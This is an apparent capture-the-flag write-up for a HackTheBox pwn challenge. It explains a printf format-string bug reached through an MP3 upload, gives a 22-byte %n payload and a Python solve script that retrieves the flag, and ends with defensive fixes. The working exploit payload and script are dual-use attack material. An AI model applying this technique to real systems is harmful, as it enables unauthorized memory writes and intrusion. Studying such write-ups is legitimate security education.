---
layout: post
title: "Pixel Audio"
date: 2028-01-26 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, format-string, printf, cwe-134, pwntools]
---

## Overview

Pixel Audio is a Medium Pwn challenge wrapped in a Flask web app. You upload an `.mp3`, the server parses it with a small C binary, and a single [format string](https://cwe.mitre.org/data/definitions/134.html) sink in that binary — `printf(user_bytes)` — is enough to flip two gate variables and make the program print the flag. Every modern mitigation (Full RELRO, stack canary, NX, PIE, CET) is enabled and none of them matter, because the win is a logic-gated write, not memory corruption.

## The technique

The Flask front-end is tiny:

```python
@app.route("/upload", methods=["POST"])   # saves the uploaded *.mp3 to /tmp/test.mp3
@app.route("/play", methods=["GET"])      # subprocess.run(["./main"], capture_output=True, text=True) -> returns stdout
```

So we fully control `/tmp/test.mp3`, and `main` → `is_mp3()`:

1. `fread` **3 magic bytes** (must equal `ID3`).
2. `fread` **22 bytes** into `buf` at `rbp-0x20`.
3. `printf("[*] Analyzing mp3 data: ")` then **`printf(buf)`** — the format string bug.
4. Two stack locals gate the win:
   - `check1 @ rbp-0x58` = `0xdead1337` — must satisfy `low16(check1) == 0xbeef`
   - `check2 @ rbp-0x50` = `0x1337beef` — must satisfy `low16(check2) == 0xc0de`
5. If both pass → `beta_test()` runs `system("clear")`, opens `./flag.txt`, and cats it to stdout.

The comparison uses `movzx eax, ax`, so **only the low 16 bits matter**. The binary helpfully keeps pointers to both gate variables live on the stack: `&check1` and `&check2` land at `printf` positional args **12** and **13** (args 9/10 hold the *values*, 11 is the `FILE*`). Confirm with a leak:

```bash
printf 'ID3%%9$p|%%10$p|%%12$p|%%13$p' > /tmp/test.mp3 && ./main
# 0xdead1337|0x1337beef|<stackaddr>|<stackaddr+8>
```

So we need two `%n`-style writes: `0xbeef`→`check1`, then `0xc0de`→`check2`. Two constraints make it fiddly.

**Constraint 1 — the 22-byte cage.** The obvious short-write payload is 24 bytes and truncates:

```
%48879c%12$hn%495c%13$hn      # 24 bytes, but only 22 are read
```

Trick: use `%n` (4-byte int write) instead of `%hn` (2-byte short). Dropping the `h` from each write saves exactly 2 bytes, and it's safe because only the low 16 bits are checked and the upper qword bytes are already zero:

```
%48879d%12$n%495d%13$n        # exactly 22 bytes
```

`48879 = 0xBEEF`, then `+495 → 49374 = 0xC0DE`. Writing the smaller target first keeps the running counter monotonic.

**Constraint 2 — ASCII-only output.** The server decodes stdout with `subprocess.run(..., text=True)`. `%c` padding emits a raw argument byte (`0xc0`, invalid UTF-8) → Flask 500s on the decode *before* returning the flag. Swapping `%c` for `%d` keeps the same format-byte length and the same counter increment, but pads with ASCII spaces and prints ASCII digits — so all output is valid UTF-8 and stdout returns.

## Solution

Create `solve.py`:

```python
import sys, re, requests
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"
FMT = b"%48879d%12$n%495d%13$n"   # 22 bytes; %d keeps output ASCII for text=True
mp3 = b"ID3" + FMT                # ID3 magic + format-string body
requests.post(base + "/upload", files={"file": ("x.mp3", mp3, "audio/mpeg")})
out = requests.get(base + "/play").text
print("FLAG:", re.search(r"HTB\{[^}]+\}", out).group(0))
```

Run it against the live instance:

```bash
python3 solve.py <target-ip> <target-port>
# [*] /upload -> 200
# [+] FLAG: HTB{...}
```

## Why it worked

A raw `printf(buf)` on attacker-controlled bytes is a textbook [externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html). What makes this one a one-shot is that the write targets — pointers to the two gate variables — are already sitting in the `printf` varargs window, so no leak and no corruption are needed: a single 22-byte string sets two integers and the program hands over the flag. The stack canary, RELRO, NX, PIE, and CET all defend against control-flow hijacking, which this exploit never attempts.

## Fix / defense

- Never pass user data as the format argument: `printf("%s", buf)`, not `printf(buf)`.
- Don't keep pointers to security-relevant locals live in the same frame as a format-string sink.
- Gate privileged behaviour (opening the flag file) on real authentication, not on two magic integers a format string can set.
- Build with `-Wformat -Wformat-security -Werror=format-security` — this call would have been a hard compile error.
